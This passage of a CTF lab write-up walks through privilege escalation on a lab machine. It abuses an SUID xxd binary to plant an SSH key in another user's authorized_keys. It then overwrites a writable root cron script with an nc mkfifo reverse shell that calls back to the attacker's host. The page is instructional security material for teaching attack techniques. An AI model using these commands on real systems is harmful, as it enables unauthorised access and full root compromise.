+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root    root    <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">5</span> 11:01 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">20</span> root    root    <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">6</span> 00:54 ..
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#ae81ff">15</span> boboyot boboyot <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">5</span> 14:53 boboyot
+</span></span></code></pre></div><p>Check sudo permissions with <code>sudo -l</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>sudo-rs: Sorry, user www-data may not run sudo on monster.
+</span></span></code></pre></div><p><code>www-data</code> has no sudo privileges.</p>
+<p>Find active SUID binaries.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -perm -04000 -ls 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">27896</span>      <span style="color:#ae81ff">8</span> -rwsr-sr-x   <span style="color:#ae81ff">1</span> boboyot  boboyot        <span style="color:#ae81ff">7180</span> Nov <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2024</span> /usr/lib/nagios/plugins/check_log
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1145</span>     <span style="color:#ae81ff">24</span> -rwsr-sr-x   <span style="color:#ae81ff">1</span> boboyot  boboyot       <span style="color:#ae81ff">22896</span> Sep <span style="color:#ae81ff">15</span> 16:38 /usr/bin/xxd
+</span></span></code></pre></div><p>We find an interesting SUID binary.</p>
+<p>The result shows an active SUID bit on <code>xxd</code>, which is a useful escalation vector.</p>
+<p>Open <a href="https://gtfobins.org/">GTFOBins</a> to find useful commands for this binary.</p>
+<p><img alt="GTFOBins entry for xxd" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-11.png"></p>
+<p>With this path, we can read and write as <code>boboyot</code>, but it does not directly give us a shell.</p>
+<p>Remember from the port scan that SSH is open. We can write an SSH key and log in as <code>boboyot</code>.</p>
+<p>To write an SSH public key, adapt the command from GTFOBins.</p>
+<p><img alt="Using xxd to write a file as another user" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-12.png"></p>
+<p>Generate an SSH key pair on the attack box.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -t ED25519 -f boboyot  
+</span></span><span style="display:flex;"><span>Generating public/private ED25519 key pair.
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;boboyot&#34;</span> <span style="color:#f92672">(</span>empty <span style="color:#66d9ef">for</span> no passphrase<span style="color:#f92672">)</span>: 
+</span></span><span style="display:flex;"><span>Enter same passphrase again: 
+</span></span><span style="display:flex;"><span>Your identification has been saved in boboyot
+</span></span><span style="display:flex;"><span>Your public key has been saved in boboyot.pub
+</span></span><span style="display:flex;"><span>The key fingerprint is:
+</span></span><span style="display:flex;"><span>SHA256:SmptK1/jJTCWZjp5tLhQci2ccDFGoHHMp3nDMM3N8O8 kali@kali
+</span></span><span style="display:flex;"><span>The key<span style="color:#960050;background-color:#1e0010">&#39;</span>s randomart image is:
+</span></span><span style="display:flex;"><span>+--<span style="color:#f92672">[</span>ED25519 256<span style="color:#f92672">]</span>--+
+</span></span><span style="display:flex;"><span>|.oo<span style="color:#f92672">=</span>*+           |
+</span></span><span style="display:flex;"><span>| +<span style="color:#f92672">=</span>.++o          |
+</span></span><span style="display:flex;"><span>|. .B. .          |
+</span></span><span style="display:flex;"><span>|  o++o o         |
+</span></span><span style="display:flex;"><span>|  ..*.@ S        |
+</span></span><span style="display:flex;"><span>|   + &amp; *         |
+</span></span><span style="display:flex;"><span>|  . B * E .      |
+</span></span><span style="display:flex;"><span>|   o.<span style="color:#f92672">=</span> + +       |
+</span></span><span style="display:flex;"><span>|    .oo .        |
+</span></span><span style="display:flex;"><span>+----<span style="color:#f92672">[</span>SHA256<span style="color:#f92672">]</span>-----+
+</span></span></code></pre></div><p>Copy the generated public key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat boboyot.pub
+</span></span><span style="display:flex;"><span>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA7xEqLulOEHxYpKn8JKZ9GyF2tkJ/woSOtphzd5kcFD kali@kali
+</span></span></code></pre></div><p>On the target machine, use <code>xxd</code> to write the public key into <code>authorized_keys</code>.</p>
+<p>Customize the command to write the SSH public key to <code>/home/boboyot/.ssh/authorized_keys</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA7xEqLulOEHxYpKn8JKZ9GyF2tkJ/woSOtphzd5kcFD kali@kali\n&#34;</span> | xxd | xxd -r - /home/boboyot/.ssh/authorized_keys
+</span></span></code></pre></div><p>Run the command on the target machine.</p>
+<p>After the overwrite succeeds, SSH as <code>boboyot</code>.</p>
+<p>Return to the attack machine and log in with the private key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh boboyot@192.168.106.129 -i boboyot
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 25.10 <span style="color:#f92672">(</span>GNU/Linux 6.17.0-14-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://docs.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/pro
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> System information as of Wed Mar <span style="color:#ae81ff">11</span> 16:17:16 UTC <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load: 0.58               Memory usage: 51%   Processes:       <span style="color:#ae81ff">305</span>
+</span></span><span style="display:flex;"><span>  Usage of /:  41.8% of 17.83GB   Swap usage:   0%    Users logged in: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Due to a now-resolved bug in the date command, this system may be unable
+</span></span><span style="display:flex;"><span>   to automatically check <span style="color:#66d9ef">for</span> updates. Manually install the update using:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     sudo apt install --update rust-coreutils
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   https://discourse.ubuntu.com/t/enabling-updates-on-ubuntu-25-10-systems/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>boboyot@monster:~$ 
+</span></span></code></pre></div><p>We now have a shell as <code>boboyot</code>.</p>
+<h2 id="privilege-escalation-to-root">Privilege escalation to root<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-to-root">#</a></h2>
+<p>Continue with the post-exploitation checklist:</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> another system user</li>
+<li><input disabled="" type="checkbox"> sudo -l</li>
+<li><input checked="" disabled="" type="checkbox"> SUID</li>
+<li><input disabled="" type="checkbox"> cronjob</li>
+<li><input disabled="" type="checkbox"> any misconfigured binary</li>
+</ul>
+<p>There are still a few items to check.</p>
+<p>Start with <code>sudo -l</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>sudo-rs: Sorry, user boboyot may not run sudo on monster.
+</span></span></code></pre></div><p><code>boboyot</code> does not have sudo permissions.</p>
+<p>Proceed to check cron jobs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/crontab
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># command to install the new version when you edit this file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># that none of the other crontabs do.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># You can also override PATH, but by default, newer versions inherit it from the environment</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example of job definition:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># .---------------- minute (0 - 59)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  .------------- hour (0 - 23)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  |  .---------- day of month (1 - 31)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |  |  |  |  |</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># *  *  *  *  * user-name command to be executed</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">{</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">{</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">{</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>* * * * * root /opt/backup.sh
+</span></span></code></pre></div><p>We find a root cron job.</p>
+<p>Analyze <code>/opt/backup.sh</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la /opt/backup.sh
+</span></span><span style="display:flex;"><span>-rwxrw---- <span style="color:#ae81ff">1</span> root boboyot <span style="color:#ae81ff">95</span> Mar  <span style="color:#ae81ff">6</span> 01:03 /opt/backup.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /opt/backup.sh
+</span></span><span style="display:flex;"><span>rm /opt/backup/*.tar.gz;tar -czf /opt/backup/boboyot_home_<span style="color:#66d9ef">$(</span>date +%Y%m%d<span style="color:#66d9ef">)</span>.tar.gz /home/boboyot
+</span></span></code></pre></div><p>This is a normal backup script for the <code>boboyot</code> home directory.</p>
+<p>From the file permissions, the <code>boboyot</code> group can write to <code>/opt/backup.sh</code>.</p>
+<p>That means we can modify the script and use the root cron job to spawn a root shell.</p>
+<p>There are several ways to spawn a root shell.</p>
+<p>I prefer using a reverse shell because the script runs every minute.</p>
+<p>This gives us a reliable way to catch the root shell from the attack box.</p>
+<p>Generate another payload with <a href="http://revshells.com">revshells.com</a>.</p>
+<p><img alt="Generating an nc mkfifo reverse shell payload" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-13.png"></p>
+<p>I use the <code>nc mkfifo</code> reverse shell payload on port 9999.</p>
+<p>Overwrite <code>/opt/backup.sh</code> with the payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.106.128 9999 &gt;/tmp/f&#39;</span> &gt; /opt/backup.sh
+</span></span></code></pre></div><p>Set up the listener.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">9999</span>               
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9999</span> ...
+</span></span></code></pre></div><p>Wait for the backup script to execute.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">9999</span>               
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9999</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>192.168.106.128<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.106.129<span style="color:#f92672">]</span> <span style="color:#ae81ff">49754</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>5447<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>root@monster:~# 
+</span></span></code></pre></div><p>We now have a root shell.</p>
+<p>Claim your flag in the Discord ticket. Bye bye.</p>
+<p>Thank you for reading.</p>
+<p><strong>AUTHOR: 𝓚𝓘𝓝𝓖</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://portfolio.aimansam.my/blog/tags/ctf/">CTF</a></li>
+      <li><a href="https://portfolio.aimansam.my/blog/tags/web/">Web</a></li>
+      <li><a href="https://portfolio.aimansam.my/blog/tags/wordpress/">Wordpress</a></li>
+      <li><a href="https://portfolio.aimansam.my/blog/tags/smb/">Smb</a></li>
+      <li><a href="https://portfolio.aimansam.my/blog/tags/privilege-escalation/">Privilege Escalation</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://portfolio.aimansam.my/blog/posts/active-directory-lab-notes/">
+    <span class="title">Next »</span>
+    <span>Active Directory Lab Notes: Enumeration, Trust Paths, and Privilege Escalation</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://portfolio.aimansam.my/blog/">zx10r Security Notes</a></span> · 
+        Labs, writeups, and security notes
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script></body>
+
+</html>
